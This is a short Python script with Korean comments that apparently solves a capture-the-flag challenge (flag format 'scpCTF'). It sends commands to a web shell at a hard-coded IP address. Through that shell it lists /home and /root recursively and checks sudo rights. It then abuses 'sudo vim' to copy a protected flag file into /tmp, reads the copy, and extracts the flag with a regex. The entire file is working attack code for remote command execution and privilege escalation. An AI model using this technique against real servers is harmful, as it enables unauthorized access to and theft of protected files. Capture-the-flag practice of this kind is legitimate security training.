import requests

def exploit_web_shell(url, command):
    payload = {'command': command}
    try:
        response = requests.post(
            url,
            data=payload,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=10
        )
        if response.status_code == 200:
            return response.text
        else:
            return f'[!] 서버 응답 실패. 상태 코드: {response.status_code}'
    except requests.exceptions.Timeout:
        return '[!] 요청 시간이 초과되었습니다.'
    except Exception as e:
        return f'[!] 오류 발생: {e}'

# 웹 셸 URL
target_url = 'http://44.210.9.208:10026/72d555bcc12032d2cb75cbf8242d7da0f8b9da37eefa7bb1153e8ac7ac7a8316/'

# 1. 파일 시스템 탐색
print("1. 파일 시스템 탐색:")
ls_output = exploit_web_shell(target_url, 'ls -laR /home /root 2>/dev/null')
print(ls_output)

# 2. sudo 권한 확인
print("\n2. sudo 권한 확인:")
sudo_output = exploit_web_shell(target_url, 'sudo -l')
print(sudo_output)

# 3. vim을 사용하여 flag.txt 읽기
print("\n3. vim을 사용하여 flag.txt 읽기:")
vim_command = "sudo vim -c 'r /home/user/secret/flag.txt' -c 'wq! /tmp/flag_output.txt'"
vim_output = exploit_web_shell(target_url, vim_command)
print(vim_output)

# 4. 플래그 내용 확인
print("\n4. 플래그 내용 확인:")
cat_output = exploit_web_shell(target_url, 'cat /tmp/flag_output.txt')
print(cat_output)

# 플래그 추출
import re
flag_pattern = r'scpCTF{.*?}'
match = re.search(flag_pattern, cat_output)
if match:
    print("\n획득한 플래그:", match.group())
else:
    print("\n플래그를 찾을 수 없습니다.")
